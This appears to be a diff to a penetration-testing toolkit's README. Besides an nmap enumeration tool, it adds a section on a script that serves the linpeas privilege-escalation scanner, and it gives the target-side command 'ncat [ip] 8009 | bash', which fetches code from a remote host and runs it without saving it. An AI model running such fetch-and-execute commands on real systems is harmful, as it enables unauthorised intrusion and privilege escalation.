@@ -19,3 +19,12 @@ A 2-step nmap enumeration tool. You will first need to set your target:
 ``` bash
 export TARGET=[IP]
 ```
+
+## kairo.sh
+Serve linpeas on port 8009 without downloading it persistently, on your target simply run:
+
+``` bash
+ncat [ip] 8009 | bash
+```
+
+(Change shell or ncat version as needed)
